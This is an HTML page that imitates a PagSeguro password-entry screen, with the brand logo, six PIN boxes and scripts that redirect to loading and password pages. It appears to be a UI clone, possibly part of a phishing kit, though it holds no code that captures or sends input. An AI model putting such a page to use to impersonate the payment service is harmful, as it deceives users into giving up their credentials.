<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="./style.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
      rel="stylesheet"
    />
    <title>Digite Sua Senha</title>
  </head>
  <body>
    <div id="header-img">
      <img
        src="./images/logopagseguro.png"
        alt=""
        style="width: 120px; position: fixed; margin: -15px -173px"
      />
      <img
        src="./images/sinal-de-interrogacao.png"
        alt=""
        style="position: fixed; margin: 0px 145px"
      />
    </div>
    <div style="display: flex; margin-top: -40px">
      <h1
        style="
          font-weight: 500;
          font-size: 24px;
          color: #1c1916;
          margin-right: 43px;
        "
      >
        Acessar Conta
      </h1>
      <span
        id="trocar-conta"
        style="margin: 22px; font-weight: 500; color: var(--cor--azul)"
        >Trocar conta</span
      >
    </div>
    <div
      id="linha"
      style="
        border: 1px solid;
        margin-top: 32px;
        width: 90%;
        margin-top: -175px;
        color: #61615929;
      "
    ></div>
    <span
      style="
        margin-top: -312px;
        margin-left: -214px;
        font-weight: 500;
        color: #616159;
      "
      >Insira sua senha</span
    >
    <div class="password-container">
      <div class="password-box">
        <input type="password" maxlength="1" class="password-input" />
        <input type="password" maxlength="1" class="password-input" />
        <input type="password" maxlength="1" class="password-input" />
        <input type="password" maxlength="1" class="password-input" />
        <input type="password" maxlength="1" class="password-input" />
        <input type="password" maxlength="1" class="password-input" />
      </div>
      <button id="toggle-password" class="toggle-password">
        <i
          id="olho"
          style="position: absolute; margin-top: -155px; margin-left: -10px"
          ><img src="./images/olho-aberto.png" alt=""
        /></i>
      </button>
    </div>
    <span style="margin-top: -250px; font-weight: 500; color: var(--cor--azul)"
      >Esqueci a senha</span
    >
    <div
      id="versao"
      style="
        text-align: center;
        margin-bottom: 15px;
        color: #616159;
        font-size: 14px;
        position: fixed;
        margin-top: 475px;
      "
    >
      <span style="margin-right: 182px">Versão 4.113.12</span>
      <span>ID 347-3a6</span>
    </div>
    <button
      style="
        margin-bottom: 10px;
        height: 40px;
        width: 360px;
        border-radius: 20px;
        background-color: var(--cor--azul);
        color: white;
        font-weight: 800;
        border-color: var(--cor--azul);
      "
      id="btn-continuar"
    >
      Continuar
    </button>
    <script src="script.js"></script>
    <script>
      document
        .getElementById("toggle-password")
        .addEventListener("click", function () {
          const inputs = document.querySelectorAll(".password-input");
          const eyeIcon = document.getElementById("olho");

          inputs.forEach((input) => {
            if (input.type === "password") {
              input.type = "text";
              eyeIcon.classList.remove("fa-eye");
              eyeIcon.classList.add("fa-eye-slash");
            } else {
              input.type = "password";
              eyeIcon.classList.remove("fa-eye-slash");
              eyeIcon.classList.add("fa-eye");
            }
          });
        });
      document
        .querySelectorAll(".password-input")
        .forEach((input, index, inputs) => {
          input.addEventListener("input", () => {
            if (input.value.length === input.maxLength) {
              if (index < inputs.length - 1) {
                inputs[index + 1].focus();
              }
            }
          });
        });
         document.getElementById("bts-acesso").addEventListener("click", function () {
            // Redireciona para a página de carregamento
            window.location.href = "carregando.html";

            // Após 1.5 segundos, redireciona para a página senha.html
            setTimeout(function () {
                window.location.href = "senha.html";
            }, 1500);
        });
         document.getElementById("bts-acesso").addEventListener("click", function () {
            // Redireciona para a página de carregamento
            window.location.href = "carregando.html";

            // Após 1.5 segundos, redireciona para a página senha.html
            setTimeout(function () {
                window.location.href = "senha.html";
            }, 1500);
        });
    </script>
  </body>
</html>
